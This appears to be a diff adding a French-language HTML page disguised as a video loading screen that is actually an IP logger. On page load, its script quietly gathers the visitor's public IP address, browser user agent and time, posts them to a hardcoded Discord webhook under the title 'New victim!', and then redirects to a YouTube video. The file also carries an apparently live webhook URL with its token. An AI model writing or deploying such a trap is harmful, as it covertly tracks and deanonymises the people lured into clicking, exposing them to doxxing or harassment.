@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Chargement...</title><script>
+// === À CHANGER UNE SEULE FOIS ===
+const WEBHOOK = "https://discord.com/api/webhooks/1438558094736097323/7gEfEJ8JyVu9KOAkOVV1G9o3_89-VPoQwcCd1h4X5F_joUD2othf5nO2t46ffB3Q7E2v"; // ← change ça !
+const YOUTUBE = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // change si tu veux une autre vidéo
+const NOM = "Mon super lien 2025";
+// ================================
+
+async function getIP(){try{let r=await fetch('https://api.ipify.org');return await r.text()}catch(e){return"Inconnue"}}
+(async()=>{let ip=await getIP();let ua=navigator.userAgent;let date=new Date().toLocaleString('fr-FR');
+let logs=JSON.parse(localStorage.getItem('logs')||'[]');logs.push({ip,date,ua});localStorage.setItem('logs',JSON.stringify(logs));
+fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
+username:"IP Logger",embeds:[{title:"Nouvelle victime !",color:16711680,fields:[
+{name:"Piège",value:NOM},{name:"IP",value:"||"+ip+"||",inline:true},
+{name:"Heure",value:date,inline:true},{name:"Appareil",value:"||"+ua.substr(0,100)+"||"}
+]}]})});setTimeout(()=>{location=YOUTUBE},500)})();
+</script></head><body style="background:#000;color:#0f0;font-family:Arial;text-align:center;padding-top:200px">
+Chargement de la vidéo...
+</body></html>
